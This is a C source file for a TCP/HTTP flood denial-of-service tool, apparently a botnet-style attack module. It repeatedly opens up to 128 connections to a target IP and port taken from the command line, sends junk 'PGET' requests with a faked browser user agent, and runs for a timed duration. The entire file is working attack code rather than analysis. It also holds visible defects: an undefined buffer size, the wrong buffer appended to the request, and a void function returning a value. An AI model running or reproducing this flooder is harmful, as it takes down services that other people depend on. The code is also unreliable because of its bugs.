#include <time.h>
#include <wait.h>
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/prctl.h>
#include <arpa/inet.h>
#include <sys/select.h>

#define RDBUF_SIZE 256
#define MAX_FDS 128

enum {
    STATE_CONNECT,
    STATE_GET_SOCK,
    STATE_SEND,
};

char chars[] = "abcdefghijklmnopqrstuvwyzABCDEFGHIJKLNOPQRSTUVWXYZ\\/=";

int connectTcp(uint32_t host, uint16_t port) {
    int fd;
    if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return -2;

    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    
    struct sockaddr_in addr = {
        .sin_addr.s_addr = host,
        .sin_port = htons(port),
        .sin_family = AF_INET,
    };

    int ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    if(errno != EINPROGRESS || ret != -1)
        return -1;

    return fd;
}

uint16_t atk_rand_int(int nMin, int nMax) {
    return rand() % ((nMax + 1) - nMin) + nMin;
}

void atk_watch(int seconds) {
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);

        sleep(seconds);
        kill(getppid(), 9);
    }
}

void randString(char *rdbuf, size_t len) {
    memset(rdbuf, 0, len);
        
    while(len--)
        *(rdbuf)++ = chars[rand() % sizeof(chars)];
}

void tcpBypassFlood(uint32_t addr, uint16_t port, uint16_t seconds) {
    if(fork() > 0)
        return 0;

    struct {
        short fd;

        int state, last;
    } states[MAX_FDS + 1];

    char rdbuf[max_psize];

    int nfds;
    char *host = inet_ntoa((struct in_addr){addr});

    atk_watch(seconds);

    while(1) {
        for(int i = 0; i < MAX_FDS; i++) {
            char reqBuf[1024 + RDBUF_SIZE] = {0};
            char rndBuf[RDBUF_SIZE] = {0};

            int err, errlen, ret;

            switch(states[i].state) {
            case STATE_CONNECT:
                states[i].last = 0;
                states[i].fd = connectTcp(addr, port);

                if(states[i].fd == -1) {
                    close(states[i].fd);
                    break;
                } else if(states[i].fd == -2) {
                    break;
                }

                states[i].last = time(NULL);
                states[i].state = STATE_GET_SOCK;
                break;
            case STATE_GET_SOCK:
                ret = getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, &err, &errlen);

                if(!ret && !err) {
                    states[i].state = STATE_SEND;
                    break;
                }

                states[i].state = STATE_CONNECT;
                break;
            case STATE_SEND:
                randString(rdbuf, RDBUF_SIZE);

                strcpy(reqBuf, "PGET \0\0\0\0\0\0\r\n");
                strcat(reqBuf, rndBuf);
                strcat(reqBuf, " HTTP/1.1\r\nHost: ");
                strcat(reqBuf, host);
                strcat(reqBuf, "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\r\n\r\n");

                send(states[i].fd, reqBuf, strlen(reqBuf), MSG_NOSIGNAL);
                close(states[i].fd);

                states[i].state = STATE_CONNECT;
                break;
            }
        }
    }
}

int main(int argc, char **argv) {
    tcpBypassFlood(inet_addr(argv[1]), atoi(argv[2]), atoi(argv[3]));
}